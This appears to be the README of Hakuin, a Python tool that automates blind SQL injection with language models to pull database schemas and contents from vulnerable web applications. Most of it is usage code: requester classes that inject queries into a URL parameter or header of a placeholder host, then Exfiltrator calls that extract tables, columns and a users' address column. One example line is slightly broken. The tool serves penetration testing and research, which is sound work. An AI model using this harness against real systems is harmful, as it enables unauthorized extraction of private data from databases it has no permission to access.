![blind_men_by_hakuin](blind_men.jpg "Blind Men by Hakuin")
# Hakuin: Optimizing Blind SQL Injection with Probabilistic Language Models
Hakuin is a Blind SQL Injection (BSQLI) inference optimization and automation framework written in Python 3. It abstract away the inference logic and allows users to easily and efficiently extract textual data in databases (DB) from vulnerable web applications. To speed up the process, Hakuin uses two pre-trained language models for DB schemas and adaptive language models in combination with opportunistic string guessing for DB content.


## Installation
To install Hakuin, simply run:
```
pip3 install . -e
```


## Examples
Once you identify a BSQLI vulnerability, you need to tell Hakuin how to inject its queries. To do this, define a class that inherits from the `Requester` class and override the `request` method.
```
import requests
from hakuin import Requester

# Example 1:
# Injecting queries into a URL query parameter and
# inferring the results from status code
class StatusRequester(Requester):
    def request(self, ctx, query):
        # inject queries into a vulnerable query parameter
        r = requests.get(f'http://vuln.com/?v=({query})--')
        # determine the query result
        return r.status_code == 200

# Example 2:
# Injecting queries into a request header and
# inferring the results from response content
class ContentRequester(Requester):
    def request(self, ctx, query):
        # inject queries into a vulnerable header
        headers = {'vulnerable-header': f'({query})--'}
        r = requests.get(f'http://vuln.com/', headers=headers)
        # determine the query result
        return 'found' in r.content.decode()
```


To start infering data, you use the `Exfiltrator` class. It uses a `DBMS` object to contruct queries and a `Requester` object to inject them. Currently, Hakuin only supports SQLite DBMS but will include more options in the near future. If you wish to support another DBMS, you need to implement the `DBMS` and `Queries` interfaces (see the `hakuin/dbms` directory).
```
import requests
from hakuin.dbms import SQLite
from hakuin import Exfiltrator, Requester

class StatusRequester(Requester):
    ...

exf = Exfiltrator(requester=StatusRequester(), dbms=SQLite())
```


Infer DB schema:
```
# Mode:
#   'binary_search': use binary search
#   'model_search': use pre-trained models and Huffman trees

# tables only
res = exf.exfiltrate_tables(mode='model_search')
# columns of a table
res = exf.exfiltrate_columns(table='users', mode='model_search')
# the whole schema
res = exf.exfiltrate_schema(mode='model_search')
```


Infer a text column:
```
# Mode:
#   'binary_search': use binary search
#   'adaptive_search': use adaptive five-gram model and Huffman Trees
#   'unigram_search': use adaptive unigram model and Huffman Trees
#   'dynamic_search': dynamically identify the best search strategy and
#                     do opporunistic string guessing
res = exfiltrate_text_data(table='users', column='address', mode='dynamic_search'):
```


More examples can be found in the `experiments` directory.